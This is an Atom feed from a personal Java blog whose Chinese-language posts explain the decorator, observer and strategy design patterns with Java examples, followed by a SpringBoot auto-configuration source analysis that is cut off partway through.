<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Dzou&#39;s Blog</title>
  
  <subtitle>No pains,no gains.</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.dzou.top/"/>
  <updated>2019-08-05T04:06:38.138Z</updated>
  <id>https://www.dzou.top/</id>
  
  <author>
    <name>dzou</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Java设计模式——装饰者模式</title>
    <link href="https://www.dzou.top/post/1b3210b0.html"/>
    <id>https://www.dzou.top/post/1b3210b0.html</id>
    <published>2019-08-05T04:04:46.000Z</published>
    <updated>2019-08-05T04:06:38.138Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Java设计模式之装饰者模式"><a href="#Java设计模式之装饰者模式" class="headerlink" title="Java设计模式之装饰者模式"></a>Java设计模式之装饰者模式</h2><p>前面两篇文章介绍了四个设计模式的原则：</p><ul><li>把变化的抽取出来，不要和不变化的放在一起</li><li>针对接口编程，不针对实现编程</li><li>多用组合，少用继承</li><li>为了交互对象之间的松耦合的设计而努力。</li></ul><p>现在我们要介绍最重要的设计原则：</p><ul><li>类应该对扩展开放，对修改关闭</li></ul><p><strong><em>装饰者模式：动态地将责任附加到对象上。若要扩展功能，装饰者提供比继承更有弹性的替代方案。</em></strong></p><p>可以动态地给对象添加一些额外的属性或者行为</p><p>装饰者模式：</p><ul><li>装饰者和被装饰者有相同的超类</li><li>可以用一个或者多个装饰者包装一个对象</li><li>因为装饰者和被装饰者有相同的超类，所以在任何需要原始对象（被包装的）的时候，你都可以用装饰过的对象替代。</li><li>装饰者可以在被装饰者的行为前后添加自己的行为。</li><li>装饰者可以如何时候被装饰，可以运行时动态地装饰对象。</li></ul><h3 id="Head-First-设计模式中案例"><a href="#Head-First-设计模式中案例" class="headerlink" title="Head First 设计模式中案例"></a>Head First 设计模式中案例</h3><p>星巴克做的咖啡有很多种类，我们想在这些咖啡上添加一些原料（牛奶、豆浆、奶泡、摩卡），还有咖啡的规格Size（大中小），我们决定使用装饰者模式来完成</p><ul><li><p>装饰者就是具体的原料类</p></li><li><p>被装饰者就是具体咖啡类</p></li></ul><p>我们使用一个抽象的<code>Beverage</code>类描述星巴克的咖啡（当然也可以使用接口），各个不同种类的咖啡继承该抽象类，我们还需要一个抽象的装饰者类，继承该装饰者类实现具体的原料装饰类，根据装饰者模式的<code>被装饰者和装饰者用相同的超类</code>，我们的装饰者抽象类需要继承<code>Beverage</code>类</p><p>计算价格我们要调用最外层的<code>cost</code>方法，每一层会委托<code>它装饰的对象-被装饰者</code>计算出价格</p><p>当我们最外层装饰者为奶泡<code>Whip</code>时，它会委托给上一层装饰者摩卡<code>Mocha</code>计算出摩卡所装饰的具体咖啡的价格+摩卡的价格；然后再加上自己奶泡的价格。(之所以可以这样实现调用多层cost是因为他们都来自一个超类对象)</p><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/design_mode/6.png"><p>Beverage类：</p><pre><code class="java">public abstract class Beverage {    //规格    protected Size size = Size.UNKNOWN;    public void setSize(Size size){        this.size = size;    }    //描述    protected String description = &quot;unKnown Beverage&quot;;    public String getDescription(){        return description;    }    //价格    public abstract double cost();}</code></pre><p>我们使用枚举类定义Size：</p><ul><li>小杯+0.1元</li><li>中杯+0.15元</li><li>大杯+0.2元</li></ul><pre><code class="java">public enum Size {    SMALL(0.10)    ,MEDIUM(0.15)    ,BIG(0.20)    ,UNKNOWN(0);    private double cost;    Size(double v) {        cost = v;    }    public double getCost(){return cost;}}</code></pre><p>三个具体的咖啡类：</p><pre><code class="java">/** * 深培咖啡 */public class DarkRoast extends Beverage{    //构造时传入规格    public DarkRoast(Size size){        setSize(size);        if(this.size==Size.UNKNOWN){            throw new RuntimeException();        }        description = &quot;DarkRoast &quot;+this.size.name();    }//30.00元+规格需加的钱    public double cost() {        return 30.00+size.getCost();    }}</code></pre><pre><code class="java">/** *浓缩咖啡 */public class Espresso extends Beverage{    public Espresso(Size size){        setSize(size);        if(this.size==Size.UNKNOWN){            throw new RuntimeException();        }        description = &quot;Espresso &quot;+this.size.name();    }    public double cost() {        return 25.00+size.getCost();    }}</code></pre><pre><code class="java">/** * 混合咖啡 */public class HouseBlend extends Beverage{    public HouseBlend(Size size){        setSize(size);        if(this.size==Size.UNKNOWN){            throw new RuntimeException();        }        description = &quot;HouseBlend &quot;+this.size.name();    }    public double cost() {        return 50.00+size.getCost();    }}</code></pre><p>原料装饰者抽象类：</p><pre><code class="java">public abstract class CondimentDecorator extends Beverage {    //描述中需要有原料信息，所以需要重写该抽象方法    public abstract String getDescription();}</code></pre><p>四个原料装饰者类：</p><ul><li>牛奶、摩卡、豆浆、奶泡</li></ul><pre><code class="java">public class Milk extends CondimentDecorator{    private Beverage beverage;    //构造方法传入需要装饰的咖啡    public Milk(Beverage beverage){        this.beverage = beverage;    }    //牛奶需要多加9元    public double cost() {        return beverage.cost()+9.00;    }    //重写的描述放方法    public String getDescription() {        return beverage.getDescription()+&quot; with Milk&quot;;    }}</code></pre><pre><code class="java">public class Mocha extends CondimentDecorator{    private Beverage beverage;    public Mocha(Beverage beverage){        this.beverage = beverage;    }    public double cost() {        return beverage.cost()+7.00;    }    public String getDescription() {        return beverage.getDescription()+&quot; with Mocha&quot;;    }}</code></pre><pre><code class="java">public class Soy extends CondimentDecorator{    private Beverage beverage;    public Soy(Beverage beverage){        this.beverage = beverage;    }    public double cost() {        return beverage.cost()+5.00;    }    public String getDescription() {        return beverage.getDescription()+&quot; with Soy&quot;;    }}</code></pre><pre><code class="java">public class Whip extends CondimentDecorator{    private Beverage beverage;    public Whip(Beverage beverage){        this.beverage = beverage;    }    public double cost() {        return beverage.cost()+15.00;    }    public String getDescription() {        return beverage.getDescription()+&quot; with Whip&quot;;    }}</code></pre><p>编写测试类：</p><pre><code class="java">public class Main {    public static void main(String[] args) {        DarkRoast darkRoast = new DarkRoast(Size.BIG);        Milk mb = new Milk(darkRoast);        System.out.println(mb.getDescription()+&quot;,cost:&quot;+mb.cost());        Mocha mochab = new Mocha(new Espresso(Size.SMALL));        System.out.println(mochab.getDescription()+&quot;,cost:&quot;+mochab.cost());        Soy sb = new Soy(new HouseBlend(Size.MEDIUM));        System.out.println(sb.getDescription()+&quot;,cost:&quot;+sb.cost());        Whip wb = new Whip(new DarkRoast(Size.BIG));        System.out.println(wb.getDescription()+&quot;,cost:&quot;+sb.cost());        Milk mb2 = new Milk(mb);        System.out.println(mb2.getDescription()+&quot;,cost:&quot;+mb2.cost());        Soy soyb = new Soy(mb2);        System.out.println(soyb.getDescription()+&quot;,cost:&quot;+soyb.cost());        Whip whipb = new Whip(soyb);        System.out.println(whipb.getDescription()+&quot;,cost:&quot;+whipb.cost());    }}</code></pre><p>输出如下</p><pre><code class="java">output：DarkRoast BIG with Milk,cost:39.2Espresso SMALL with Mocha,cost:32.1HouseBlend MEDIUM with Soy,cost:55.15DarkRoast BIG with Whip,cost:55.15DarkRoast BIG with Milk with Milk,cost:48.2DarkRoast BIG with Milk with Milk with Soy,cost:53.2DarkRoast BIG with Milk with Milk with Soy with Whip,cost:68.2</code></pre><h3 id="JDK中装饰者——IO"><a href="#JDK中装饰者——IO" class="headerlink" title="JDK中装饰者——IO"></a>JDK中装饰者——IO</h3><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/design_mode/8.png"><p>IO中<code>InputStream</code>和<code>OutputStream</code>就是抽象的超类，<code>Reader</code>和<code>Writer</code>也是抽象的超类。整个IO家族都是由装饰者模式构成的。</p><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/design_mode/7.png">]]></content>
    
    <summary type="html">
    
      装饰者模式：装饰者和被装饰者有相同的超类-可以用一个或者多个装饰者包装一个对象，因为装饰者和被装饰者有相同的超类，所以在任何需要原始对象（被包装的）的时候，你都可以用装饰过的对象替代，装饰者可以在被装饰者的行为前后添加自己的行为，装饰者可以如何时候被装饰，可以运行时动态地装饰对象。
    
    </summary>
    
      <category term="Java基础" scheme="https://www.dzou.top/categories/Java%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Java" scheme="https://www.dzou.top/tags/Java/"/>
    
      <category term="基础" scheme="https://www.dzou.top/tags/%E5%9F%BA%E7%A1%80/"/>
    
      <category term="面试" scheme="https://www.dzou.top/tags/%E9%9D%A2%E8%AF%95/"/>
    
      <category term="设计模式" scheme="https://www.dzou.top/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>Java设计模式——观察者模式</title>
    <link href="https://www.dzou.top/post/261ed4ab.html"/>
    <id>https://www.dzou.top/post/261ed4ab.html</id>
    <published>2019-08-04T04:15:54.000Z</published>
    <updated>2019-08-04T08:28:19.068Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Java设计模式之观察者模式"><a href="#Java设计模式之观察者模式" class="headerlink" title="Java设计模式之观察者模式"></a>Java设计模式之观察者模式</h2><p>前面一篇文章提到了策略模式，提出了三个设计原则，这里提出第四个设计原则</p><p>设计原则：</p><ul><li>为了交互对象之间的松耦合的设计而努力。</li></ul><p>针对报社：<code>出版者</code>+<code>订阅者</code>=<code>观察者模式</code></p><p>报社是获取信息的主题对象，当报社获取到的信息更新了，报社将把信息传送给它的订阅者；当然订阅者也可以通知报社停止订阅，报社就把该对象从订阅者列表中去除，他不再能接收到报社传送的信息。</p><p><strong>观察者模式：定义了对象之间的一对多依赖，这样一来，当一个对象改变状态时。它的所有依赖者都会收到通知并自动更新。</strong></p><p>观察者模式有两个部分：</p><ul><li>观察者</li><li>主题（也叫被观察者）</li></ul><p>一个主题对象关联了多个观察者，当主体对象有数据更新或者状态改变时，它就可以通知它所关联的观察者们；就如果狗对象、猫对象、老鼠对象已经注册成为观察者，他们就将在主体对象数据更新时接收到主题对象发送的通知（通知数据更新了，你可以通过pull或者push的方式获取），这也就是<code>java.util</code>包下的<code>Observer</code>和<code>Observable</code>实现的观察者模式</p><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/design_mode/4.png"><p>我们通过Head FIrst 设计模式中的场景实现观察者模式</p><p><strong><em>场景：一个气象站由<code>WeatherData</code>类或者气象数据<code>温度、湿度、气压</code>，作为主题类，由多个公告板（展示效果不同，数据都是这三个）作为观察者类，当气象数据更新或者改变时，该类将通知公告板更新展示的数据。</em></strong></p><p>WeatherData该主题需要能<code>添加观察者</code>，<code>删除观察者</code>，<code>通知观察者更新数据</code>,并且要获取气象局发布的数据</p><p>我们把主体对象写一个接口如下，不同主题实现不同功能只需实现该接口</p><pre><code class="java">public interface Subject {    //添加观察者    void registerObserver(Observer o);    //删除    void removeObserver(Observer o);    //通知    void notifyObservers(List&lt;Observer&gt; o);    void setChanged();    boolean getChanged();}</code></pre><p>其中<code>setChanged方法</code>把数据是否更新的状态的标志设置为True，在更新状态或者数据时执行该方法</p><p><code>getChanged()</code>获取该标志</p><p><code>WeatherData</code>只需实现该接口，添加获取气象数据的方法即可</p><pre><code class="java">public class WeatherData implements Subject{    private WeatherArgs args = new WeatherArgs();    private List&lt;Observer&gt; obs = new ArrayList&lt;&gt;();    private boolean changed = false;    //设置数据    void setWeatherData(String template,String humidity,String pressure){        args.setTemplate(template);        args.setHumidity(humidity);        args.setPressure(pressure);        //更新完成后设置标志为true        setChanged();        //调用更新后通知观察者方法        onWeatherDataChanged();    }    //数据更新时通知观察者 push数据给观察者    private void onWeatherDataChanged(){        if(getChanged()){            notifyObservers(obs);        }    }    //观察者注册    public void registerObserver(Observer o) {        if(o==null){            throw new RuntimeException();        }        obs.add(o);    }    //观察者移除    public void removeObserver(Observer o) {        obs.remove(o);    }    //通知观察者们数据更新 发送数据给观察者们    public void notifyObservers(List&lt;Observer&gt; obs) {        obs.forEach((o)-&gt;o.update(this,args));    }    @Override    public void setChanged() {        changed = true;    }    @Override    public boolean getChanged() {        return changed;    }}</code></pre><p>其中<code>WeatherArg</code>为气象数据参数类，当我们不使用这个类时，我们需要每次更新时传入特定的值，下面这样</p><pre><code class="java">update(String template,String humidity,String pressure);update(100,200,200kpa);</code></pre><p>这样需要更改数据种类和数量时，需要修改很多代码，所以我们把它封装起来</p><pre><code class="java">@Dataclass WeatherArgs {    //温度    private String template;    //湿度    private String humidity;    //气压    private String pressure;}</code></pre><p>添加这个类是为了如果需要更改数据类型和数量时只需更改这个类就行</p><p>我们用List存放观察者，<code>onWeatherDataChanged</code>方法检测是否更新，如果更新就通知观察者</p><p>观察者有多个，其中都有<code>update</code>方法执行被通知时更新数据，通过不同的<code>display</code>方法展示不同效果的气象数据，我们编写两个接口</p><ul><li>观察者接口 （有多个观察者）Observer</li><li>展示数据接口（有不同展示方法） Displayable</li></ul><pre><code class="java">public interface Observer {    /**     * 更新数据     * @param subject 主题对象     * @param args 更新参数     */    void update(Subject subject,Object args);}</code></pre><pre><code class="java">public interface Displayable {    /**     * 数据展示方法     */    void display();}</code></pre><p>下面我们实现一个观察者</p><p>它需要实现<code>Observer和`Displayable</code>接口实现<code>update和display</code>方法</p><p>我们在构造方法传入一个主题对象，告诉他我们要订阅他</p><pre><code class="java">public class CurrentConditionDisplay implements Observer,Displayable{    //可用于观察者对主题对象取消订阅    private Subject subject;    private WeatherArgs weatherArgs;    //创建时注册    public CurrentConditionDisplay(Subject s){        s.registerObserver(this);        subject = s;    }    @Override    public void update(Subject subject, Object args) {        if(subject instanceof WeatherData){            weatherArgs = (WeatherArgs) args;            display();        }    }    @Override    public void display() {        System.out.println(&quot;template:&quot;+weatherArgs.getTemplate()+&quot;, humidity:&quot;+weatherArgs.getHumidity()+&quot;, pressure:&quot;+weatherArgs.getPressure());    }    //观察者取消订阅 通知主题对象删除我    private void removeMe(){        subject.removeObserver(this);    }}</code></pre><p>至此，观察者模式就完成了</p><p>写一个测试类：</p><pre><code class="java">public class Main {    public static void main(String[] args) {        WeatherData weatherData = new WeatherData();        CurrentConditionDisplay currentConditionDisplay = new CurrentConditionDisplay(weatherData);        weatherData.setWeatherData(&quot;100&quot;,&quot;90&quot;,&quot;100KPa&quot;);    }}</code></pre><pre><code class="java">output：template:100, humidity:90, pressure:100KPa</code></pre><blockquote><p>大家可以看一下JDK中内置的<code>Observer和Observable</code>实现的观察者模式，大体实现是一样的</p></blockquote><p>JDK内置观察者模式</p><p><code>Observable</code>被观察者</p><pre><code class="java">public class Observable {    private boolean changed = false;    private Vector&lt;Observer&gt; obs;    public Observable() {        obs = new Vector&lt;&gt;();    }    public synchronized void addObserver(Observer o) {        if (o == null)            throw new NullPointerException();        if (!obs.contains(o)) {            obs.addElement(o);        }    }    public synchronized void deleteObserver(Observer o) {        obs.removeElement(o);    }    public void notifyObservers() {        notifyObservers(null);    }    public void notifyObservers(Object arg) {        Object[] arrLocal;        synchronized (this) {            if (!changed)                return;            arrLocal = obs.toArray();            clearChanged();        }        for (int i = arrLocal.length-1; i&gt;=0; i--)            ((Observer)arrLocal[i]).update(this, arg);    }    public synchronized void deleteObservers() {        obs.removeAllElements();    }    protected synchronized void setChanged() {        changed = true;    }    protected synchronized void clearChanged() {        changed = false;    }    public synchronized boolean hasChanged() {        return changed;    }    public synchronized int countObservers() {        return obs.size();    }}</code></pre><p><code>Observer</code></p><pre><code class="java">public interface Observer {    //o为被观察者主题，args为更新的数据    void update(Observable o, Object arg);}</code></pre><p>但是我们可以看到该<code>Observable</code>是具体的实现类，不符合设计模式中的</p><ul><li>多用组合少用继承</li></ul><p>不方便我们继承其他类</p><p>有两个办法 ：</p><ul><li>使用上述我们自己实现的观察者模式</li><li>扩展Observable类</li></ul><p>代码地址：<a href="https://github.com/ding-zou/design_mode/tree/master/observer_patterns" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/ding-zou/design_mode/tree/master/observer_patterns</a></p>]]></content>
    
    <summary type="html">
    
      当对象间存在一对多关系时，则使用观察者模式（Observer Pattern）。比如，当一个对象被修改时，则会自动通知它的依赖对象。观察者模式属于行为型模式。
    
    </summary>
    
      <category term="Java基础" scheme="https://www.dzou.top/categories/Java%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Java" scheme="https://www.dzou.top/tags/Java/"/>
    
      <category term="基础" scheme="https://www.dzou.top/tags/%E5%9F%BA%E7%A1%80/"/>
    
      <category term="面试" scheme="https://www.dzou.top/tags/%E9%9D%A2%E8%AF%95/"/>
    
      <category term="设计模式" scheme="https://www.dzou.top/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>Java设计模式——策略模式</title>
    <link href="https://www.dzou.top/post/6c84d9a1.html"/>
    <id>https://www.dzou.top/post/6c84d9a1.html</id>
    <published>2019-08-03T06:15:05.000Z</published>
    <updated>2019-08-04T04:20:24.038Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Java设计模式之策略模式"><a href="#Java设计模式之策略模式" class="headerlink" title="Java设计模式之策略模式"></a>Java设计模式之策略模式</h2><p>设计模式基础：</p><ul><li>抽象</li><li>多态</li><li>继承</li><li>组合</li></ul><p>设计原则：</p><ul><li><p>把变化的抽取出来，不要和不变化的放在一起</p></li><li><p>针对接口编程，不针对实现编程</p></li><li><p>多用组合，少用继承</p></li></ul><p>我们先把定义提出来：</p><p><strong>策略模式：定义了算法族，分别封装起来，让他们之间可以相互替换，此模式让算法的变化独立于使用算法的客户。</strong></p><p>这个概念比较难理解，下面我们具体通过案例分析一下</p><p>场景：我们有三个不同种类的程序员，JavaWeb、大数据BigData和Ai人工智能程序员；他们都有相同的喝水和睡觉行为，但是有不同的写代码行为（写JavaWeb，写Ai，写Big data），我们想一下怎么实现？</p><p>我们首先想到的是使用<code>继承重写父类的方法</code>实现，但是这样做的缺点很多：</p><pre><code class="java">Class JavaWebProgrammer extends Programmer{    public void doSleeping(){        //重写代码    }    public void doCoding(){        //重写代码    }}</code></pre><ul><li>可以解决问题，但是代码无法复用</li><li>多一个类都要重新写它对应的实现，代码量太大</li><li>不符合三个设计原则</li><li>而且无法解决有些类没有或者不需要基类的某个功能 比如有的程序员退休了，有的没有退休</li></ul><p>此时，针对<code>某个类不需要实现基类某个功能</code>你又想到了在重写中什么都不做的方法：</p><pre><code class="java">public void retired(){    //do noting}</code></pre><p>但是这样依然没有解决上面的根本问题，所以我们又想到了<code>使用接口</code>：把不会变化的功能（睡觉行为和喝水行为依然放在基类里，会变化的行为（写代码行为）写成一个接口<code>Codeable</code>，然后通过继承基类实现不变的行为，实现Codeable接口实现不同的写代码行为</p><p>但是这么做还是不行：</p><ul><li>如果有很多子类的实现需要修改，那么我们要修改很多的代码</li></ul><p>这个时候我们就应该充分考虑<code>设计原则</code>的作用了</p><ul><li>把变化的部分封装起来</li><li>面向接口编程</li></ul><p>大家就可以想到把接口的实现独立成一个个类，把写代码行为写成一个接口，不同的实现对应不同的实现类，然后我们在使用时，想到了<code>多态</code>的奇妙之处，根据多态的动态调用</p><p>如下：</p><pre><code class="java">ProgramBehavior programBehavior = new JavaWebBehavior();programBehavior.doCoding();</code></pre><p>在此，我们大体思路已经很接近成功了</p><ul><li><p>首先基类声明为<code>抽象类</code>，里面有睡觉和喝水行为的具体实现（不变的）</p><pre><code class="java">    protected void doDrinking(){        System.out.println(&quot;I am drinking.&quot;);    }    protected void doSleeping(){        System.out.println(&quot;I am sleeping&quot;);    }</code></pre></li><li><p>在基类中声明变化的部分，使用接口的形式使得我们可以动态调用</p><pre><code class="java">ProgramBehavior programBehavior；void doCoding(){    programBehavior.doCoding();}</code></pre></li><li><p>创建写代码行为的接口</p><pre><code class="java">public interface ProgramBehavior {    void doCoding();}</code></pre></li><li><p>子类<code>AIProgrammer</code>继承抽象类<code>Programmer</code>，只需要在初始化时创建<code>AIBehavior</code>赋给我们基类的接口<code>programBehavior</code></p><pre><code class="java">public class AIProgrammer extends Programmer {    public AIProgrammer(){        programBehavior = new AIBehavior();    }}</code></pre></li><li><p>创建不同的接口实现类，实现不同的写代码行为</p><pre><code class="java">public class AIBehavior implements ProgramBehavior {    @Override    public void doCoding() {        System.out.println(&quot;I am doing AI coding.&quot;);    }}</code></pre></li><li><p>测试</p><pre><code class="java">public void testAI(){        Programmer aiProgrammer = new AIProgrammer();        aiProgrammer.doDrinking();        aiProgrammer.doCoding();        aiProgrammer.doSleeping();    }</code></pre><p>结果如下：</p></li></ul><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/design_mode/1.png"><p>可见：我们使用多态动态调用了<code>doCoding()</code>方法，我们在需要修改实现的时候只需要需要修改接口对应的实现就可以了，而不需要修改子类的方法</p><p>当然，我们不应该在开发中使用初始化时创建实现类的这种方式，我们可以在<code>基类</code>中添加一个<code>setProgramBehavior</code>的方法，这样我们就可以在应用中动态的设置行为</p><pre><code class="java">void setProgramBehavior(ProgramBehavior programBehavior){        this.programBehavior = programBehavior;}</code></pre><p>我们为AIProgramer在执行完睡觉后2秒设置一个新的写代码行为（退休）并调用</p><pre><code class="java">public class RetireBehavior implements ProgramBehavior {    @Override    public void doCoding() {        System.out.println(&quot;I am retired just few days.&quot;);    }}</code></pre><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/design_mode/2.png"><p>该AIProgramer类图如下</p><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/design_mode/3.png"><blockquote><p>至此，这就是整个策略模式的设计方法，我们再来理一遍，也许你再去看策略模式的定义就没问题了（代码最后附上）</p></blockquote><p>我们把行为中（每个行为可以看成一个算法，形成了算法族）变化的部分从基类抽象类中抽取出来，使用接口定义并使用类实现接口来实现某一个行为（算法）不同的表现，再利用<code>多态</code>的神奇之处动态调用接口不同实现类的同一方法；然后我们需要改变接口实现类的实现方法（算法）时对调用该方法的客户完成不需要更改，没有任何影响。</p><p>代码地址：</p><p> <a href="https://github.com/ding-zou/design_mode" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/ding-zou/design_mode</a></p>]]></content>
    
    <summary type="html">
    
      Java设计模式之策略模式：定义了算法族，分别封装起来，让他们之间可以相互替换，此模式让算法的变化独立于使用算法的客户。
    
    </summary>
    
      <category term="Java基础" scheme="https://www.dzou.top/categories/Java%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Java" scheme="https://www.dzou.top/tags/Java/"/>
    
      <category term="基础" scheme="https://www.dzou.top/tags/%E5%9F%BA%E7%A1%80/"/>
    
      <category term="面试" scheme="https://www.dzou.top/tags/%E9%9D%A2%E8%AF%95/"/>
    
      <category term="设计模式" scheme="https://www.dzou.top/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>SpringBoot自动配置源码分析及详解</title>
    <link href="https://www.dzou.top/post/366ffd58.html"/>
    <id>https://www.dzou.top/post/366ffd58.html</id>
    <published>2019-08-02T11:32:01.000Z</published>
    <updated>2019-08-02T12:11:53.759Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SpringBoot自动配置"><a href="#SpringBoot自动配置" class="headerlink" title="SpringBoot自动配置"></a>SpringBoot自动配置</h2><p>我们都知道一个SpringBoot主配置类只要标注上<u>@SpringBootApplication</u>的注解，Spring就会帮我们自动配置各个组件和实例化Bean，我们来通过源码分析一下SpringBoot自动配置原理。</p><p>首先我们要知道，SpringBoot将符合条件的@Configuration类都加载到Spring容器中，就像一只八爪鱼，我们的启动类就是一个典型的@Configuration类。</p><h3 id="SpringBootApplication"><a href="#SpringBootApplication" class="headerlink" title="@SpringBootApplication"></a>@SpringBootApplication</h3><p>包括下面两个关键的注解</p><pre><code class="java">@SpringBootConfiguration@EnableAutoConfiguration</code></pre><p>其中@SpringBootConfiguration 就是get主配置类添加上@Configuration 注解让主配置类的自动配置能被扫描到</p><p>下面我们主要分析一下@EnableAutoConfiguration 注解</p><h3 id="EnableAutoConfiguration"><a href="#EnableAutoConfiguration" class="headerlink" title="@EnableAutoConfiguration"></a>@EnableAutoConfiguration</h3><p>其中也包含两个关键注解</p><pre><code class="java">@AutoConfigurationPackage@Import({AutoConfigurationImportSelector.class})</code></pre><ul><li>第一个用作包扫描自动配置</li><li>第二个导入AutoConfigurationImportSelector类用作SpringBoot提供的其他组件的自动配置选择器</li></ul><p>我们先看一下第一个</p><h4 id="AutoConfigurationPackage"><a href="#AutoConfigurationPackage" class="headerlink" title="@AutoConfigurationPackage"></a>@AutoConfigurationPackage</h4><p>这个注解导入了SpringBoot中的Registrar类 用作包路径下的Bean扫描并注册到BeanFactory中</p><pre><code class="java">@Import({Registrar.class})</code></pre><p>详细看一下这个类</p><h4 id="Registrar注册类"><a href="#Registrar注册类" class="headerlink" title="Registrar注册类"></a>Registrar注册类</h4><p>其中主要的方法是registerBeanDefinitions</p><pre><code class="java">static class Registrar implements ImportBeanDefinitionRegistrar, DeterminableImports {    public void registerBeanDefinitions(AnnotationMetadata metadata, BeanDefinitionRegistry registry) {        //获取到元信息的包名传入注册器        AutoConfigurationPackages.register(registry, (new AutoConfigurationPackages.PackageImport(metadata)).getPackageName());    }</code></pre><p>传入两个参数：</p><ul><li>metadata 启动类元信息</li><li>registry 用作注册的Bean注册器</li></ul><p>目录结构如下：</p><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/autoconfig/9.png"><p>元信息如下：</p><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/autoconfig/2.png"><p>new AutoConfigurationPackages.PackageImport(metadata)).getPackageName()获取到该启动类所在路径的包名，传如register方法注册该包名下的所有需要注册并实例化的Bean（包括@Component @Service @Mapper @Repository等）</p><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/autoconfig/3.png"><h5 id="AutoConfigurationPackages中register方法"><a href="#AutoConfigurationPackages中register方法" class="headerlink" title="AutoConfigurationPackages中register方法"></a>AutoConfigurationPackages中register方法</h5><pre><code class="java">public static void register(BeanDefinitionRegistry registry, String... packageNames) </code></pre><p>根据传入的register和包名packageName注册该包名下的所有需要注册并实例化的Bean</p><p>其中我们要关注的是下面这段代码：</p><ul><li>GenericBeanDefinition 创建Bean的一站式组件，包括Bean的参数、属性、类的信息</li></ul><pre><code class="java">//新建一个GenericBeanDefinition描述Bean的实例GenericBeanDefinition beanDefinition = new GenericBeanDefinition();       //设置bean的类名称beanDefinition.setBeanClass(AutoConfigurationPackages.BasePackages.class);//获取构造器参数并保存beanDefinition.getConstructorArgumentValues().addIndexedArgumentValue(0, packageNames);//Bean的角色 感兴趣的可以去了解一下，有0,1,2对应三种不同角色beanDefinition.setRole(2);//参数设置完调用registerBeanDefinition注册并实例化Beanregistry.registerBeanDefinition(BEAN, beanDefinition);}</code></pre><h6 id="getConstructorArgumentValues"><a href="#getConstructorArgumentValues" class="headerlink" title="getConstructorArgumentValues"></a>getConstructorArgumentValues</h6><p>这个方法用于获取构造器参数并保存</p><ul><li>ConstructorArgumentValues 是一个构造器参数保存器，保存Bean的构造方法的参数</li></ul><pre><code class="java">public ConstructorArgumentValues getConstructorArgumentValues() {    if (this.constructorArgumentValues == null) {        //创建一个新的构造器参数保存器        this.constructorArgumentValues = new ConstructorArgumentValues();    }    return this.constructorArgumentValues;}</code></pre><h6 id="DefaultListableBeanFactory中实现的registerBeanDefinition方法"><a href="#DefaultListableBeanFactory中实现的registerBeanDefinition方法" class="headerlink" title="DefaultListableBeanFactory中实现的registerBeanDefinition方法"></a>DefaultListableBeanFactory中实现的registerBeanDefinition方法</h6><p>该方法对GenericBeanDefinition创建的Bean进行注册到BeanFactory</p><p>传入beanName和beanDefinition</p><pre><code class="java">public void registerBeanDefinition(String beanName, BeanDefinition beanDefinition)</code></pre><ul><li>检查完Bean是否合法后先判断是否存在相同Bean的注册，存在抛出异常，不存在执行如下</li></ul><p>其中主要代码如下：</p><pre><code class="java">//开始注册Bean//如果已启动注册状态则要加锁注册单例singletonif (this.hasBeanCreationStarted()) {    synchronized(this.beanDefinitionMap) {        //把Bean存入beanDefinitionMap        this.beanDefinitionMap.put(beanName, beanDefinition);        List&lt;String&gt; updatedDefinitions = new ArrayList(this.beanDefinitionNames.size() + 1);        //把需要注册的Bean添加到map中        updatedDefinitions.addAll(this.beanDefinitionNames);        updatedDefinitions.add(beanName);        this.beanDefinitionNames = updatedDefinitions;        //默认为单例        if (this.manualSingletonNames.contains(beanName)) {            Set&lt;String&gt; updatedSingletons = new LinkedHashSet(this.manualSingletonNames);            updatedSingletons.remove(beanName);            this.manualSingletonNames = updatedSingletons;        }    }    //如果未启动直接注册无需加锁} else {    this.beanDefinitionMap.put(beanName, beanDefinition);    this.beanDefinitionNames.add(beanName);    this.manualSingletonNames.remove(beanName);}</code></pre><p>下图就是beanDefinitionMap返回的值，里面除了Spring框架提供的一些必要的Bean需要注册外，就是我们主启动类所在包下的所有需要扫描的Bean，我只有一个主启动类和一个controller 下面标出</p><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/autoconfig/4.png"><p>当我尝试把写的HelloWorldController的@RestController注解注释掉以后，SpringBoot没有扫描到这个Controller，也就没有把它注册到BeanFactory中</p><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/autoconfig/10.png"><h4 id="AutoConfigurationImportSelector"><a href="#AutoConfigurationImportSelector" class="headerlink" title="AutoConfigurationImportSelector"></a>AutoConfigurationImportSelector</h4><p>看完@AutoConfigurationPackage 注解我们看一下 @EnableAutoConfiguration另一个注解@Import({AutoConfigurationImportSelector.class}) 该注解导入了SpringBoot中AutoConfigurationImportSelector类（自动配置选择器）用作选择SpringBoot提供的所需组件Bean的选择并自动配置</p><p>主要是下面的方法</p><h5 id="getAutoConfigurationEntry方法"><a href="#getAutoConfigurationEntry方法" class="headerlink" 